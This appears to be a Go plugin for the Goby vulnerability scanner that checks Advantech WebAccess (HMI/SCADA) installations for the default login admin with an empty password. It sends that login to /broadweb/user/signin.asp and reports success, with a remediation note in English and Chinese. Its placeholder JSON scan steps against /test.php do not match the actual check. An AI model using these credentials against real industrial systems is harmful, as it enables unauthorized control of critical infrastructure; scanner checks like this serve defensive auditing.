package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ADVANTECH WebAccess Default Password Vulnerability",
    "Description": "<p>Advantech WebAccess is a HMI/SCADA monitoring software completely based on IE browser. The system has a default password. An attacker can control the entire platform with the default password (admin:null) and operate the core functions with administrator privileges.</p>",
    "Product": "ADVANTECH-WebAccess",
    "Homepage": "http://webaccess.advantech.com/",
    "DisclosureDate": "2022-03-31",
    "Author": "13eczou",
    "FofaQuery": "body=\"broadweb\"",
    "GobyQuery": "body=\"broadweb\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through the default password vulnerability, and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "ADVANTECH WebAccess 默认口令漏洞",
            "Product": "ADVANTECH-WebAccess",
            "Description": "<p>Advantech WebAccess 是一款完全基于IE浏览器的 HMI/SCADA 监控软件。</p><p>该系统存在默认口令，攻击者可通过默认口令（admin:空）控制整个平台，使用管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "ADVANTECH WebAccess Default Password Vulnerability",
            "Product": "ADVANTECH-WebAccess",
            "Description": "<p>Advantech WebAccess is a HMI/SCADA monitoring software completely based on IE browser. The system has a default password. An attacker can control the entire platform with the default password (admin:null) and operate the core functions with administrator privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through the default password&nbsp;vulnerability, and use administrator privileges to operate core functions.</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-27",
    "PocId": "10840"
}`
	sendLoginPayloadG5tx4RYF := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		loginRequestConfig := httpclient.NewPostRequestConfig("/broadweb/user/signin.asp")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		loginRequestConfig.Data = url.PathEscape("page=/broadweb/signin.asp&pos=&username=admin&password=&remMe=&submit1=登录")
		return httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendLoginPayloadG5tx4RYF(hostInfo)
			success := resp != nil && resp.StatusCode == 302 && strings.Contains(resp.HeaderString.String(), "bwproj.asp")
			if success {
				stepLogs.VulURL = hostInfo.Scheme() + "://admin:@" + hostInfo.HostInfo
			}
			return success
		}, nil,
	))
}
